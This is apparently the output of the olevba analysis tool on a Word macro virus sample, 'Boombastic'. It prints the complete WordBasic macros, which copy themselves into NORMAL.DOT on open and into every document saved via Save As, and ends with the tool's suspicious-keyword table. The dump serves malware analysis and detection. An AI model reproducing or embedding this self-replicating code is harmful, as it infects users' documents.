olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Boombastic.a-0548983beb9a10d92bb0e52f590aae41b3382126
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Boombastic.a-0548983beb9a10d92bb0e52f590aae41b3382126 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Boombastic.a-0548983beb9a10d92bb0e52f590aae41b3382126 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim Anzahl
Rem Mr. Boombastic and Sir WIXALOT !!!
On Error Resume Next
WordBasic.ToolsOptionsSave FastSaves:=1, GlobalDotPrompt:=0
    For Anzahl = 1 To WordBasic.CountMacros(0)
        If WordBasic.[MacroName$](Anzahl, 0) = "System" Then GoTo ciao
    Next Anzahl
    WordBasic.Organizer Copy:=1, Source:=WordBasic.[FileName$](0), Destination:=WordBasic.[DefaultDir$](2) + "\NORMAL.DOT", Name:="AutoOpen", Tab:=3
    WordBasic.Organizer Copy:=1, Source:=WordBasic.[FileName$](0), Destination:=WordBasic.[DefaultDir$](2) + "\NORMAL.DOT", Name:="DateiSpeichernUnter", Tab:=3
    WordBasic.Organizer Copy:=1, Source:=WordBasic.[FileName$](0), Destination:=WordBasic.[DefaultDir$](2) + "\NORMAL.DOT", Name:="System", Tab:=3
    WordBasic.Organizer Copy:=1, Source:=WordBasic.[FileName$](0), Destination:=WordBasic.[DefaultDir$](2) + "\NORMAL.DOT", Name:="AutoExec", Tab:=3
ciao:
WordBasic.Call "AutoExec"
End Sub
-------------------------------------------------------------------------------
VBA MACRO DateiSpeichernUnter.bas 
in file: Virus.MSWord.Boombastic.a-0548983beb9a10d92bb0e52f590aae41b3382126 - OLE stream: 'Macros/VBA/DateiSpeichernUnter'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim formatnr
Dim Datname$
Dim Anzahl
Rem Only a test, but a good one, from Mr. Boombastic and Sir WIXALOT !!!
On Error GoTo -1: On Error GoTo ciao
WordBasic.ToolsOptionsSave FastSaves:=1, GlobalDotPrompt:=0
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
formatnr = dlg.Format
If formatnr = 0 Or 1 Or 6 Then
    Datname$ = dlg.Name
    dlg.Format = 1
        WordBasic.FileSaveAs dlg
        For Anzahl = 1 To WordBasic.CountMacros(1, 0, 0)
                If WordBasic.[MacroName$](Anzahl, 1) = "System" Then GoTo ciao
        Next Anzahl
        WordBasic.Organizer Copy:=1, Source:=WordBasic.[DefaultDir$](2) + "\NORMAL.DOT", Destination:=Datname$, Name:="AutoOpen", Tab:=3
        WordBasic.Organizer Copy:=1, Source:=WordBasic.[DefaultDir$](2) + "\NORMAL.DOT", Destination:=Datname$, Name:="DateiSpeichernUnter", Tab:=3
        WordBasic.Organizer Copy:=1, Source:=WordBasic.[DefaultDir$](2) + "\NORMAL.DOT", Destination:=Datname$, Name:="System", Tab:=3
        WordBasic.Organizer Copy:=1, Source:=WordBasic.[DefaultDir$](2) + "\NORMAL.DOT", Destination:=Datname$, Name:="AutoExec", Tab:=3
    If WordBasic.IsDocumentDirty() = -1 Then WordBasic.FileSave
Else
    WordBasic.FileSaveAs dlg
End If
ciao:
WordBasic.Call "AutoExec"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

